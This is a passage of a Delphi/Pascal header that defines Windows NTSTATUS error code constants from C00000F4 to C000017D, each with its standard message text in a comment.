STATUS_INVALID_PARAMETER_6       = NTSTATUS($C00000F4);

//
// MessageId: STATUS_INVALID_PARAMETER_7
//
// MessageText:
//
// An invalid parameter was passed to a service or function as the seventh argument.
//
STATUS_INVALID_PARAMETER_7       = NTSTATUS($C00000F5);

//
// MessageId: STATUS_INVALID_PARAMETER_8
//
// MessageText:
//
// An invalid parameter was passed to a service or function as the eighth argument.
//
STATUS_INVALID_PARAMETER_8       = NTSTATUS($C00000F6);

//
// MessageId: STATUS_INVALID_PARAMETER_9
//
// MessageText:
//
// An invalid parameter was passed to a service or function as the ninth argument.
//
STATUS_INVALID_PARAMETER_9       = NTSTATUS($C00000F7);

//
// MessageId: STATUS_INVALID_PARAMETER_10
//
// MessageText:
//
// An invalid parameter was passed to a service or function as the tenth argument.
//
STATUS_INVALID_PARAMETER_10      = NTSTATUS($C00000F8);

//
// MessageId: STATUS_INVALID_PARAMETER_11
//
// MessageText:
//
// An invalid parameter was passed to a service or function as the eleventh argument.
//
STATUS_INVALID_PARAMETER_11      = NTSTATUS($C00000F9);

//
// MessageId: STATUS_INVALID_PARAMETER_12
//
// MessageText:
//
// An invalid parameter was passed to a service or function as the twelfth argument.
//
STATUS_INVALID_PARAMETER_12      = NTSTATUS($C00000FA);

//
// MessageId: STATUS_REDIRECTOR_NOT_STARTED
//
// MessageText:
//
// An attempt was made to access a network file, but the network software was not yet started.
//
STATUS_REDIRECTOR_NOT_STARTED    = NTSTATUS($C00000FB);

//
// MessageId: STATUS_REDIRECTOR_STARTED
//
// MessageText:
//
// An attempt was made to start the redirector, but the redirector has already been started.
//
STATUS_REDIRECTOR_STARTED        = NTSTATUS($C00000FC);

//
// MessageId: STATUS_STACK_OVERFLOW
//
// MessageText:
//
// A new guard page for the stack cannot be created.
//
STATUS_STACK_OVERFLOW            = NTSTATUS($C00000FD);    // winnt

//
// MessageId: STATUS_NO_SUCH_PACKAGE
//
// MessageText:
//
// A specified authentication package is unknown.
//
STATUS_NO_SUCH_PACKAGE           = NTSTATUS($C00000FE);

//
// MessageId: STATUS_BAD_FUNCTION_TABLE
//
// MessageText:
//
// A malformed function table was encountered during an unwind operation.
//
STATUS_BAD_FUNCTION_TABLE        = NTSTATUS($C00000FF);

//
// MessageId: STATUS_VARIABLE_NOT_FOUND
//
// MessageText:
//
// Indicates the specified environment variable name was not found in the specified environment block.
//
STATUS_VARIABLE_NOT_FOUND        = NTSTATUS($C0000100);

//
// MessageId: STATUS_DIRECTORY_NOT_EMPTY
//
// MessageText:
//
// Indicates that the directory trying to be deleted is not empty.
//
STATUS_DIRECTORY_NOT_EMPTY       = NTSTATUS($C0000101);

//
// MessageId: STATUS_FILE_CORRUPT_ERROR
//
// MessageText:
//
// {Corrupt File}
// The file or directory %hs is corrupt and unreadable.
// Please run the Chkdsk utility.
//
STATUS_FILE_CORRUPT_ERROR        = NTSTATUS($C0000102);

//
// MessageId: STATUS_NOT_A_DIRECTORY
//
// MessageText:
//
// A requested opened file is not a directory.
//
STATUS_NOT_A_DIRECTORY           = NTSTATUS($C0000103);

//
// MessageId: STATUS_BAD_LOGON_SESSION_STATE
//
// MessageText:
//
// The logon session is not in a state that is consistent with the requested operation.
//
STATUS_BAD_LOGON_SESSION_STATE   = NTSTATUS($C0000104);

//
// MessageId: STATUS_LOGON_SESSION_COLLISION
//
// MessageText:
//
// An internal LSA error has occurred. An authentication package has requested the creation of a Logon Session but the ID of an already existing Logon Session has been specified.
//
STATUS_LOGON_SESSION_COLLISION   = NTSTATUS($C0000105);

//
// MessageId: STATUS_NAME_TOO_LONG
//
// MessageText:
//
// A specified name string is too long for its intended use.
//
STATUS_NAME_TOO_LONG             = NTSTATUS($C0000106);

//
// MessageId: STATUS_FILES_OPEN
//
// MessageText:
//
// The user attempted to force close the files on a redirected drive, but there were opened files on the drive, and the user did not specify a sufficient level of force.
//
STATUS_FILES_OPEN                = NTSTATUS($C0000107);

//
// MessageId: STATUS_CONNECTION_IN_USE
//
// MessageText:
//
// The user attempted to force close the files on a redirected drive, but there were opened directories on the drive, and the user did not specify a sufficient level of force.
//
STATUS_CONNECTION_IN_USE         = NTSTATUS($C0000108);

//
// MessageId: STATUS_MESSAGE_NOT_FOUND
//
// MessageText:
//
// RtlFindMessage could not locate the requested message ID in the message table resource.
//
STATUS_MESSAGE_NOT_FOUND         = NTSTATUS($C0000109);

//
// MessageId: STATUS_PROCESS_IS_TERMINATING
//
// MessageText:
//
// An attempt was made to access an exiting process.
//
STATUS_PROCESS_IS_TERMINATING    = NTSTATUS($C000010A);

//
// MessageId: STATUS_INVALID_LOGON_TYPE
//
// MessageText:
//
// Indicates an invalid value has been provided for the LogonType requested.
//
STATUS_INVALID_LOGON_TYPE        = NTSTATUS($C000010B);

//
// MessageId: STATUS_NO_GUID_TRANSLATION
//
// MessageText:
//
// Indicates that an attempt was made to assign protection to a file system file or directory and one of the SIDs in the security descriptor could not be translated into a GUID that could be stored by the file system.
// This causes the protection attempt to fail, which may cause a file creation attempt to fail.
//
STATUS_NO_GUID_TRANSLATION       = NTSTATUS($C000010C);

//
// MessageId: STATUS_CANNOT_IMPERSONATE
//
// MessageText:
//
// Indicates that an attempt has been made to impersonate via a named pipe that has not yet been read from.
//
STATUS_CANNOT_IMPERSONATE        = NTSTATUS($C000010D);

//
// MessageId: STATUS_IMAGE_ALREADY_LOADED
//
// MessageText:
//
// Indicates that the specified image is already loaded.
//
STATUS_IMAGE_ALREADY_LOADED      = NTSTATUS($C000010E);


//
// ============================================================
// NOTE: The following ABIOS error code should be reserved on
//       non ABIOS kernel. Eventually, I will remove the ifdef
//       ABIOS.
// ============================================================
//
//
// MessageId: STATUS_ABIOS_NOT_PRESENT
//
// MessageText:
//
//  STATUS_ABIOS_NOT_PRESENT
//
STATUS_ABIOS_NOT_PRESENT         = NTSTATUS($C000010F);

//
// MessageId: STATUS_ABIOS_LID_NOT_EXIST
//
// MessageText:
//
//  STATUS_ABIOS_LID_NOT_EXIST
//
STATUS_ABIOS_LID_NOT_EXIST       = NTSTATUS($C0000110);

//
// MessageId: STATUS_ABIOS_LID_ALREADY_OWNED
//
// MessageText:
//
//  STATUS_ABIOS_LID_ALREADY_OWNED
//
STATUS_ABIOS_LID_ALREADY_OWNED   = NTSTATUS($C0000111);

//
// MessageId: STATUS_ABIOS_NOT_LID_OWNER
//
// MessageText:
//
//  STATUS_ABIOS_NOT_LID_OWNER
//
STATUS_ABIOS_NOT_LID_OWNER       = NTSTATUS($C0000112);

//
// MessageId: STATUS_ABIOS_INVALID_COMMAND
//
// MessageText:
//
//  STATUS_ABIOS_INVALID_COMMAND
//
STATUS_ABIOS_INVALID_COMMAND     = NTSTATUS($C0000113);

//
// MessageId: STATUS_ABIOS_INVALID_LID
//
// MessageText:
//
//  STATUS_ABIOS_INVALID_LID
//
STATUS_ABIOS_INVALID_LID         = NTSTATUS($C0000114);

//
// MessageId: STATUS_ABIOS_SELECTOR_NOT_AVAILABLE
//
// MessageText:
//
//  STATUS_ABIOS_SELECTOR_NOT_AVAILABLE
//
STATUS_ABIOS_SELECTOR_NOT_AVAILABLE = NTSTATUS($C0000115);

//
// MessageId: STATUS_ABIOS_INVALID_SELECTOR
//
// MessageText:
//
//  STATUS_ABIOS_INVALID_SELECTOR
//
STATUS_ABIOS_INVALID_SELECTOR    = NTSTATUS($C0000116);

//
// MessageId: STATUS_NO_LDT
//
// MessageText:
//
// Indicates that an attempt was made to change the size of the LDT for a process that has no LDT.
//
STATUS_NO_LDT                    = NTSTATUS($C0000117);

//
// MessageId: STATUS_INVALID_LDT_SIZE
//
// MessageText:
//
// Indicates that an attempt was made to grow an LDT by setting its size, or that the size was not an even number of selectors.
//
STATUS_INVALID_LDT_SIZE          = NTSTATUS($C0000118);

//
// MessageId: STATUS_INVALID_LDT_OFFSET
//
// MessageText:
//
// Indicates that the starting value for the LDT information was not an integral multiple of the selector size.
//
STATUS_INVALID_LDT_OFFSET        = NTSTATUS($C0000119);

//
// MessageId: STATUS_INVALID_LDT_DESCRIPTOR
//
// MessageText:
//
// Indicates that the user supplied an invalid descriptor when trying to set up Ldt descriptors.
//
STATUS_INVALID_LDT_DESCRIPTOR    = NTSTATUS($C000011A);

//
// MessageId: STATUS_INVALID_IMAGE_NE_FORMAT
//
// MessageText:
//
// The specified image file did not have the correct format. It appears to be NE format.
//
STATUS_INVALID_IMAGE_NE_FORMAT   = NTSTATUS($C000011B);

//
// MessageId: STATUS_RXACT_INVALID_STATE
//
// MessageText:
//
// Indicates that the transaction state of a registry sub-tree is incompatible with the requested operation. For example, a request has been made to start a new transaction with one already in progress, or a request has been made to apply a transaction when one is not currently in progress.
//
STATUS_RXACT_INVALID_STATE       = NTSTATUS($C000011C);

//
// MessageId: STATUS_RXACT_COMMIT_FAILURE
//
// MessageText:
//
// Indicates an error has occurred during a registry transaction commit. The database has been left in an unknown, but probably inconsistent, state. The state of the registry transaction is left as COMMITTING.
//
STATUS_RXACT_COMMIT_FAILURE      = NTSTATUS($C000011D);

//
// MessageId: STATUS_MAPPED_FILE_SIZE_ZERO
//
// MessageText:
//
// An attempt was made to map a file of size zero with the maximum size specified as zero.
//
STATUS_MAPPED_FILE_SIZE_ZERO     = NTSTATUS($C000011E);

//
// MessageId: STATUS_TOO_MANY_OPENED_FILES
//
// MessageText:
//
// Too many files are opened on a remote server.
// This error should only be returned by the Windows redirector on a remote drive.
//
STATUS_TOO_MANY_OPENED_FILES     = NTSTATUS($C000011F);

//
// MessageId: STATUS_CANCELLED
//
// MessageText:
//
// The I/O request was canceled.
//
STATUS_CANCELLED                 = NTSTATUS($C0000120);

//
// MessageId: STATUS_CANNOT_DELETE
//
// MessageText:
//
// An attempt has been made to remove a file or directory that cannot be deleted.
//
STATUS_CANNOT_DELETE             = NTSTATUS($C0000121);

//
// MessageId: STATUS_INVALID_COMPUTER_NAME
//
// MessageText:
//
// Indicates a name specified as a remote computer name is syntactically invalid.
//
STATUS_INVALID_COMPUTER_NAME     = NTSTATUS($C0000122);

//
// MessageId: STATUS_FILE_DELETED
//
// MessageText:
//
// An I/O request other than close was performed on a file after it has been deleted, which can only happen to a request which did not complete before the last handle was closed via NtClose.
//
STATUS_FILE_DELETED              = NTSTATUS($C0000123);

//
// MessageId: STATUS_SPECIAL_ACCOUNT
//
// MessageText:
//
// Indicates an operation has been attempted on a built-in (specia); SAM account which is incompatible with built-in accounts. For example, built-in accounts cannot be deleted.
//
STATUS_SPECIAL_ACCOUNT           = NTSTATUS($C0000124);

//
// MessageId: STATUS_SPECIAL_GROUP
//
// MessageText:
//
// The operation requested may not be performed on the specified group because it is a built-in special group.
//
STATUS_SPECIAL_GROUP             = NTSTATUS($C0000125);

//
// MessageId: STATUS_SPECIAL_USER
//
// MessageText:
//
// The operation requested may not be performed on the specified user because it is a built-in special user.
//
STATUS_SPECIAL_USER              = NTSTATUS($C0000126);

//
// MessageId: STATUS_MEMBERS_PRIMARY_GROUP
//
// MessageText:
//
// Indicates a member cannot be removed from a group because the group is currently the member's primary group.
//
STATUS_MEMBERS_PRIMARY_GROUP     = NTSTATUS($C0000127);

//
// MessageId: STATUS_FILE_CLOSED
//
// MessageText:
//
// An I/O request other than close and several other special case operations was attempted using a file object that had already been closed.
//
STATUS_FILE_CLOSED               = NTSTATUS($C0000128);

//
// MessageId: STATUS_TOO_MANY_THREADS
//
// MessageText:
//
// Indicates a process has too many threads to perform the requested action. For example, assignment of a primary token may only be performed when a process has zero or one threads.
//
STATUS_TOO_MANY_THREADS          = NTSTATUS($C0000129);

//
// MessageId: STATUS_THREAD_NOT_IN_PROCESS
//
// MessageText:
//
// An attempt was made to operate on a thread within a specific process, but the thread specified is not in the process specified.
//
STATUS_THREAD_NOT_IN_PROCESS     = NTSTATUS($C000012A);

//
// MessageId: STATUS_TOKEN_ALREADY_IN_USE
//
// MessageText:
//
// An attempt was made to establish a token for use as a primary token but the token is already in use. A token can only be the primary token of one process at a time.
//
STATUS_TOKEN_ALREADY_IN_USE      = NTSTATUS($C000012B);

//
// MessageId: STATUS_PAGEFILE_QUOTA_EXCEEDED
//
// MessageText:
//
// Page file quota was exceeded.
//
STATUS_PAGEFILE_QUOTA_EXCEEDED   = NTSTATUS($C000012C);

//
// MessageId: STATUS_COMMITMENT_LIMIT
//
// MessageText:
//
// {Out of Virtual Memory}
// Your system is low on virtual memory. To ensure that Windows runs properly, increase the size of your virtual memory paging file. For more information, see Help.
//
STATUS_COMMITMENT_LIMIT          = NTSTATUS($C000012D);

//
// MessageId: STATUS_INVALID_IMAGE_LE_FORMAT
//
// MessageText:
//
// The specified image file did not have the correct format, it appears to be LE format.
//
STATUS_INVALID_IMAGE_LE_FORMAT   = NTSTATUS($C000012E);

//
// MessageId: STATUS_INVALID_IMAGE_NOT_MZ
//
// MessageText:
//
// The specified image file did not have the correct format, it did not have an initial MZ.
//
STATUS_INVALID_IMAGE_NOT_MZ      = NTSTATUS($C000012F);

//
// MessageId: STATUS_INVALID_IMAGE_PROTECT
//
// MessageText:
//
// The specified image file did not have the correct format, it did not have a proper e_lfarlc in the MZ header.
//
STATUS_INVALID_IMAGE_PROTECT     = NTSTATUS($C0000130);

//
// MessageId: STATUS_INVALID_IMAGE_WIN_16
//
// MessageText:
//
// The specified image file did not have the correct format, it appears to be a 16-bit Windows image.
//
STATUS_INVALID_IMAGE_WIN_16      = NTSTATUS($C0000131);

//
// MessageId: STATUS_LOGON_SERVER_CONFLICT
//
// MessageText:
//
// The Netlogon service cannot start because another Netlogon service running in the domain conflicts with the specified role.
//
STATUS_LOGON_SERVER_CONFLICT     = NTSTATUS($C0000132);

//
// MessageId: STATUS_TIME_DIFFERENCE_AT_DC
//
// MessageText:
//
// The time at the Primary Domain Controller is different than the time at the Backup Domain Controller or member server by too large an amount.
//
STATUS_TIME_DIFFERENCE_AT_DC     = NTSTATUS($C0000133);

//
// MessageId: STATUS_SYNCHRONIZATION_REQUIRED
//
// MessageText:
//
// The SAM database on a Windows Server is significantly out of synchronization with the copy on the Domain Controller. A complete synchronization is required.
//
STATUS_SYNCHRONIZATION_REQUIRED  = NTSTATUS($C0000134);

//
// MessageId: STATUS_DLL_NOT_FOUND
//
// MessageText:
//
// The code execution cannot proceed because %hs was not found. Reinstalling the program may fix this problem.
//
STATUS_DLL_NOT_FOUND             = NTSTATUS($C0000135);    // winnt

//
// MessageId: STATUS_OPEN_FAILED
//
// MessageText:
//
// The NtCreateFile API failed. This error should never be returned to an application, it is a place holder for the Windows Lan Manager Redirector to use in its internal error mapping routines.
//
STATUS_OPEN_FAILED               = NTSTATUS($C0000136);

//
// MessageId: STATUS_IO_PRIVILEGE_FAILED
//
// MessageText:
//
// {Privilege Failed}
// The I/O permissions for the process could not be changed.
//
STATUS_IO_PRIVILEGE_FAILED       = NTSTATUS($C0000137);

//
// MessageId: STATUS_ORDINAL_NOT_FOUND
//
// MessageText:
//
// {Ordinal Not Found}
// The ordinal %ld could not be located in the dynamic link library %hs.
//
STATUS_ORDINAL_NOT_FOUND         = NTSTATUS($C0000138);    // winnt

//
// MessageId: STATUS_ENTRYPOINT_NOT_FOUND
//
// MessageText:
//
// {Entry Point Not Found}
// The procedure entry point %hs could not be located in the dynamic link library %hs.
//
STATUS_ENTRYPOINT_NOT_FOUND      = NTSTATUS($C0000139);    // winnt

//
// MessageId: STATUS_CONTROL_C_EXIT
//
// MessageText:
//
// {Application Exit by CTRL+C}
// The application terminated as a result of a CTRL+C.
//
STATUS_CONTROL_C_EXIT            = NTSTATUS($C000013A);    // winnt

//
// MessageId: STATUS_LOCAL_DISCONNECT
//
// MessageText:
//
// {Virtual Circuit Closed}
// The network transport on your computer has closed a network connection. There may or may not be I/O requests outstanding.
//
STATUS_LOCAL_DISCONNECT          = NTSTATUS($C000013B);

//
// MessageId: STATUS_REMOTE_DISCONNECT
//
// MessageText:
//
// {Virtual Circuit Closed}
// The network transport on a remote computer has closed a network connection. There may or may not be I/O requests outstanding.
//
STATUS_REMOTE_DISCONNECT         = NTSTATUS($C000013C);

//
// MessageId: STATUS_REMOTE_RESOURCES
//
// MessageText:
//
// {Insufficient Resources on Remote Computer}
// The remote computer has insufficient resources to complete the network request. For instance, there may not be enough memory available on the remote computer to carry out the request at this time.
//
STATUS_REMOTE_RESOURCES          = NTSTATUS($C000013D);

//
// MessageId: STATUS_LINK_FAILED
//
// MessageText:
//
// {Virtual Circuit Closed}
// An existing connection (virtual circuit) has been broken at the remote computer. There is probably something wrong with the network software protocol or the network hardware on the remote computer.
//
STATUS_LINK_FAILED               = NTSTATUS($C000013E);

//
// MessageId: STATUS_LINK_TIMEOUT
//
// MessageText:
//
// {Virtual Circuit Closed}
// The network transport on your computer has closed a network connection because it had to wait too long for a response from the remote computer.
//
STATUS_LINK_TIMEOUT              = NTSTATUS($C000013F);

//
// MessageId: STATUS_INVALID_CONNECTION
//
// MessageText:
//
// The connection handle given to the transport was invalid.
//
STATUS_INVALID_CONNECTION        = NTSTATUS($C0000140);

//
// MessageId: STATUS_INVALID_ADDRESS
//
// MessageText:
//
// The address handle given to the transport was invalid.
//
STATUS_INVALID_ADDRESS           = NTSTATUS($C0000141);

//
// MessageId: STATUS_DLL_INIT_FAILED
//
// MessageText:
//
// {DLL Initialization Failed}
// Initialization of the dynamic link library %hs failed. The process is terminating abnormally.
//
STATUS_DLL_INIT_FAILED           = NTSTATUS($C0000142);    // winnt

//
// MessageId: STATUS_MISSING_SYSTEMFILE
//
// MessageText:
//
// {Missing System File}
// The required system file %hs is bad or missing.
//
STATUS_MISSING_SYSTEMFILE        = NTSTATUS($C0000143);

//
// MessageId: STATUS_UNHANDLED_EXCEPTION
//
// MessageText:
//
// {Application Error}
// The exception %s (0x%08lx) occurred in the application at location 0x%p.
//
STATUS_UNHANDLED_EXCEPTION       = NTSTATUS($C0000144);

//
// MessageId: STATUS_APP_INIT_FAILURE
//
// MessageText:
//
// {Application Error}
// The application was unable to start correctly (0x%lx). Click OK to close the application.
//
STATUS_APP_INIT_FAILURE          = NTSTATUS($C0000145);

//
// MessageId: STATUS_PAGEFILE_CREATE_FAILED
//
// MessageText:
//
// {Unable to Create Paging File}
// The creation of the paging file %hs failed (%lx). The requested size was %ld.
//
STATUS_PAGEFILE_CREATE_FAILED    = NTSTATUS($C0000146);

//
// MessageId: STATUS_NO_PAGEFILE
//
// MessageText:
//
// {No Paging File Specified}
// No paging file was specified in the system configuration.
//
STATUS_NO_PAGEFILE               = NTSTATUS($C0000147);

//
// MessageId: STATUS_INVALID_LEVEL
//
// MessageText:
//
// {Incorrect System Call Level}
// An invalid level was passed into the specified system call.
//
STATUS_INVALID_LEVEL             = NTSTATUS($C0000148);

//
// MessageId: STATUS_WRONG_PASSWORD_CORE
//
// MessageText:
//
// {Incorrect Password to LAN Manager Server}
// You specified an incorrect password to a LAN Manager 2.x or MS-NET server.
//
STATUS_WRONG_PASSWORD_CORE       = NTSTATUS($C0000149);

//
// MessageId: STATUS_ILLEGAL_FLOAT_CONTEXT
//
// MessageText:
//
// {EXCEPTION}
// A real-mode application issued a floating-point instruction and floating-point hardware is not present.
//
STATUS_ILLEGAL_FLOAT_CONTEXT     = NTSTATUS($C000014A);

//
// MessageId: STATUS_PIPE_BROKEN
//
// MessageText:
//
// The pipe operation has failed because the other end of the pipe has been closed.
//
STATUS_PIPE_BROKEN               = NTSTATUS($C000014B);

//
// MessageId: STATUS_REGISTRY_CORRUPT
//
// MessageText:
//
// {The Registry Is Corrupt}
// The structure of one of the files that contains Registry data is corrupt, or the image of the file in memory is corrupt, or the file could not be recovered because the alternate copy or log was absent or corrupt.
//
STATUS_REGISTRY_CORRUPT          = NTSTATUS($C000014C);

//
// MessageId: STATUS_REGISTRY_IO_FAILED
//
// MessageText:
//
// An I/O operation initiated by the Registry failed unrecoverably. The Registry could not read in, or write out, or flush, one of the files that contain the system's image of the Registry.
//
STATUS_REGISTRY_IO_FAILED        = NTSTATUS($C000014D);

//
// MessageId: STATUS_NO_EVENT_PAIR
//
// MessageText:
//
// An event pair synchronization operation was performed using the thread specific client/server event pair object, but no event pair object was associated with the thread.
//
STATUS_NO_EVENT_PAIR             = NTSTATUS($C000014E);

//
// MessageId: STATUS_UNRECOGNIZED_VOLUME
//
// MessageText:
//
// The volume does not contain a recognized file system. Please make sure that all required file system drivers are loaded and that the volume is not corrupt.
//
STATUS_UNRECOGNIZED_VOLUME       = NTSTATUS($C000014F);

//
// MessageId: STATUS_SERIAL_NO_DEVICE_INITED
//
// MessageText:
//
// No serial device was successfully initialized. The serial driver will unload.
//
STATUS_SERIAL_NO_DEVICE_INITED   = NTSTATUS($C0000150);

//
// MessageId: STATUS_NO_SUCH_ALIAS
//
// MessageText:
//
// The specified local group does not exist.
//
STATUS_NO_SUCH_ALIAS             = NTSTATUS($C0000151);

//
// MessageId: STATUS_MEMBER_NOT_IN_ALIAS
//
// MessageText:
//
// The specified account name is not a member of the group.
//
STATUS_MEMBER_NOT_IN_ALIAS       = NTSTATUS($C0000152);

//
// MessageId: STATUS_MEMBER_IN_ALIAS
//
// MessageText:
//
// The specified account name is already a member of the group.
//
STATUS_MEMBER_IN_ALIAS           = NTSTATUS($C0000153);

//
// MessageId: STATUS_ALIAS_EXISTS
//
// MessageText:
//
// The specified local group already exists.
//
STATUS_ALIAS_EXISTS              = NTSTATUS($C0000154);

//
// MessageId: STATUS_LOGON_NOT_GRANTED
//
// MessageText:
//
// A requested type of logon (e.g., Interactive, Network, Service) is not granted by the target system's local security policy.
// Please ask the system administrator to grant the necessary form of logon.
//
STATUS_LOGON_NOT_GRANTED         = NTSTATUS($C0000155);

//
// MessageId: STATUS_TOO_MANY_SECRETS
//
// MessageText:
//
// The maximum number of secrets that may be stored in a single system has been exceeded. The length and number of secrets is limited to satisfy United States State Department export restrictions.
//
STATUS_TOO_MANY_SECRETS          = NTSTATUS($C0000156);

//
// MessageId: STATUS_SECRET_TOO_LONG
//
// MessageText:
//
// The length of a secret exceeds the maximum length allowed. The length and number of secrets is limited to satisfy United States State Department export restrictions.
//
STATUS_SECRET_TOO_LONG           = NTSTATUS($C0000157);

//
// MessageId: STATUS_INTERNAL_DB_ERROR
//
// MessageText:
//
// The Local Security Authority (LSA) database contains an internal inconsistency.
//
STATUS_INTERNAL_DB_ERROR         = NTSTATUS($C0000158);

//
// MessageId: STATUS_FULLSCREEN_MODE
//
// MessageText:
//
// The requested operation cannot be performed in fullscreen mode.
//
STATUS_FULLSCREEN_MODE           = NTSTATUS($C0000159);

//
// MessageId: STATUS_TOO_MANY_CONTEXT_IDS
//
// MessageText:
//
// During a logon attempt, the user's security context accumulated too many security IDs. This is a very unusual situation. Remove the user from some global or local groups to reduce the number of security ids to incorporate into the security context.
//
STATUS_TOO_MANY_CONTEXT_IDS      = NTSTATUS($C000015A);

//
// MessageId: STATUS_LOGON_TYPE_NOT_GRANTED
//
// MessageText:
//
// A user has requested a type of logon (e.g., interactive or network) that has not been granted. An administrator has control over who may logon interactively and through the network.
//
STATUS_LOGON_TYPE_NOT_GRANTED    = NTSTATUS($C000015B);

//
// MessageId: STATUS_NOT_REGISTRY_FILE
//
// MessageText:
//
// The system has attempted to load or restore a file into the registry, and the specified file is not in the format of a registry file.
//
STATUS_NOT_REGISTRY_FILE         = NTSTATUS($C000015C);

//
// MessageId: STATUS_NT_CROSS_ENCRYPTION_REQUIRED
//
// MessageText:
//
// An attempt was made to change a user password in the security account manager without providing the necessary Windows cross-encrypted password.
//
STATUS_NT_CROSS_ENCRYPTION_REQUIRED = NTSTATUS($C000015D);

//
// MessageId: STATUS_DOMAIN_CTRLR_CONFIG_ERROR
//
// MessageText:
//
// A Windows Server has an incorrect configuration.
//
STATUS_DOMAIN_CTRLR_CONFIG_ERROR = NTSTATUS($C000015E);

//
// MessageId: STATUS_FT_MISSING_MEMBER
//
// MessageText:
//
// An attempt was made to explicitly access the secondary copy of information via a device control to the Fault Tolerance driver and the secondary copy is not present in the system.
//
STATUS_FT_MISSING_MEMBER         = NTSTATUS($C000015F);

//
// MessageId: STATUS_ILL_FORMED_SERVICE_ENTRY
//
// MessageText:
//
// A configuration registry node representing a driver service entry was ill-formed and did not contain required value entries.
//
STATUS_ILL_FORMED_SERVICE_ENTRY  = NTSTATUS($C0000160);

//
// MessageId: STATUS_ILLEGAL_CHARACTER
//
// MessageText:
//
// An illegal character was encountered. For a multi-byte character set this includes a lead byte without a succeeding trail byte. For the Unicode character set this includes the characters 0xFFFF and 0xFFFE.
//
STATUS_ILLEGAL_CHARACTER         = NTSTATUS($C0000161);

//
// MessageId: STATUS_UNMAPPABLE_CHARACTER
//
// MessageText:
//
// No mapping for the Unicode character exists in the target multi-byte code page.
//
STATUS_UNMAPPABLE_CHARACTER      = NTSTATUS($C0000162);

//
// MessageId: STATUS_UNDEFINED_CHARACTER
//
// MessageText:
//
// The Unicode character is not defined in the Unicode character set installed on the system.
//
STATUS_UNDEFINED_CHARACTER       = NTSTATUS($C0000163);

//
// MessageId: STATUS_FLOPPY_VOLUME
//
// MessageText:
//
// The paging file cannot be created on a floppy diskette.
//
STATUS_FLOPPY_VOLUME             = NTSTATUS($C0000164);

//
// MessageId: STATUS_FLOPPY_ID_MARK_NOT_FOUND
//
// MessageText:
//
// {Floppy Disk Error}
// While accessing a floppy disk, an ID address mark was not found.
//
STATUS_FLOPPY_ID_MARK_NOT_FOUND  = NTSTATUS($C0000165);

//
// MessageId: STATUS_FLOPPY_WRONG_CYLINDER
//
// MessageText:
//
// {Floppy Disk Error}
// While accessing a floppy disk, the track address from the sector ID field was found to be different than the track address maintained by the controller.
//
STATUS_FLOPPY_WRONG_CYLINDER     = NTSTATUS($C0000166);

//
// MessageId: STATUS_FLOPPY_UNKNOWN_ERROR
//
// MessageText:
//
// {Floppy Disk Error}
// The floppy disk controller reported an error that is not recognized by the floppy disk driver.
//
STATUS_FLOPPY_UNKNOWN_ERROR      = NTSTATUS($C0000167);

//
// MessageId: STATUS_FLOPPY_BAD_REGISTERS
//
// MessageText:
//
// {Floppy Disk Error}
// While accessing a floppy-disk, the controller returned inconsistent results via its registers.
//
STATUS_FLOPPY_BAD_REGISTERS      = NTSTATUS($C0000168);

//
// MessageId: STATUS_DISK_RECALIBRATE_FAILED
//
// MessageText:
//
// {Hard Disk Error}
// While accessing the hard disk, a recalibrate operation failed, even after retries.
//
STATUS_DISK_RECALIBRATE_FAILED   = NTSTATUS($C0000169);

//
// MessageId: STATUS_DISK_OPERATION_FAILED
//
// MessageText:
//
// {Hard Disk Error}
// While accessing the hard disk, a disk operation failed even after retries.
//
STATUS_DISK_OPERATION_FAILED     = NTSTATUS($C000016A);

//
// MessageId: STATUS_DISK_RESET_FAILED
//
// MessageText:
//
// {Hard Disk Error}
// While accessing the hard disk, a disk controller reset was needed, but even that failed.
//
STATUS_DISK_RESET_FAILED         = NTSTATUS($C000016B);

//
// MessageId: STATUS_SHARED_IRQ_BUSY
//
// MessageText:
//
// An attempt was made to open a device that was sharing an IRQ with other devices.
// At least one other device that uses that IRQ was already opened.
// Two concurrent opens of devices that share an IRQ and only work via interrupts is not supported for the particular bus type that the devices use.
//
STATUS_SHARED_IRQ_BUSY           = NTSTATUS($C000016C);

//
// MessageId: STATUS_FT_ORPHANING
//
// MessageText:
//
// {FT Orphaning}
// A disk that is part of a fault-tolerant volume can no longer be accessed.
//
STATUS_FT_ORPHANING              = NTSTATUS($C000016D);

//
// MessageId: STATUS_BIOS_FAILED_TO_CONNECT_INTERRUPT
//
// MessageText:
//
// The system bios failed to connect a system interrupt to the device or bus for which the device is connected.
//
STATUS_BIOS_FAILED_TO_CONNECT_INTERRUPT = NTSTATUS($C000016E);

//
// MessageId: STATUS_PARTITION_FAILURE
//
// MessageText:
//
// Tape could not be partitioned.
//
STATUS_PARTITION_FAILURE         = NTSTATUS($C0000172);

//
// MessageId: STATUS_INVALID_BLOCK_LENGTH
//
// MessageText:
//
// When accessing a new tape of a multivolume partition, the current blocksize is incorrect.
//
STATUS_INVALID_BLOCK_LENGTH      = NTSTATUS($C0000173);

//
// MessageId: STATUS_DEVICE_NOT_PARTITIONED
//
// MessageText:
//
// Tape partition information could not be found when loading a tape.
//
STATUS_DEVICE_NOT_PARTITIONED    = NTSTATUS($C0000174);

//
// MessageId: STATUS_UNABLE_TO_LOCK_MEDIA
//
// MessageText:
//
// Attempt to lock the eject media mechanism fails.
//
STATUS_UNABLE_TO_LOCK_MEDIA      = NTSTATUS($C0000175);

//
// MessageId: STATUS_UNABLE_TO_UNLOAD_MEDIA
//
// MessageText:
//
// Unload media fails.
//
STATUS_UNABLE_TO_UNLOAD_MEDIA    = NTSTATUS($C0000176);

//
// MessageId: STATUS_EOM_OVERFLOW
//
// MessageText:
//
// Physical end of tape was detected.
//
STATUS_EOM_OVERFLOW              = NTSTATUS($C0000177);

//
// MessageId: STATUS_NO_MEDIA
//
// MessageText:
//
// {No Media}
// There is no media in the drive. Please insert media into drive %hs.
//
STATUS_NO_MEDIA                  = NTSTATUS($C0000178);

//
// MessageId: STATUS_NO_SUCH_MEMBER
//
// MessageText:
//
// A member could not be added to or removed from the local group because the member does not exist.
//
STATUS_NO_SUCH_MEMBER            = NTSTATUS($C000017A);

//
// MessageId: STATUS_INVALID_MEMBER
//
// MessageText:
//
// A new member could not be added to a local group because the member has the wrong account type.
//
STATUS_INVALID_MEMBER            = NTSTATUS($C000017B);

//
// MessageId: STATUS_KEY_DELETED
//
// MessageText:
//
// Illegal operation attempted on a registry key which has been marked for deletion.
//
STATUS_KEY_DELETED               = NTSTATUS($C000017C);

//
// MessageId: STATUS_NO_LOG_SPACE
//
// MessageText:
//
// System could not allocate required space in a registry log.
//
STATUS_NO_LOG_SPACE              = NTSTATUS($C000017D);

//
